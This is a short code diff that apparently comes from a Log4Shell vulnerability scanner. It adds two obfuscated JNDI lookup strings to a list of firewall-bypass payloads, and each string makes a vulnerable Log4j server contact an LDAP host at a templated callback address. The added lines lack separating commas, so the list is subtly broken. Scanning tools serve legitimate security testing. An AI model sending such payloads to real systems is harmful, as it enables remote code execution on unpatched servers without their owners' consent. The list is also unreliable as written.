@@ -73,6 +73,8 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                        "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
+                       "${jndi:${lower:l}${lower:d}ap://{{callback_host}}}"
+                       "${jndi:${lower:l}${lower:d}ap://{{callback_host}}/{{random}}}"
                        ]
 
 cve_2021_45046 = [
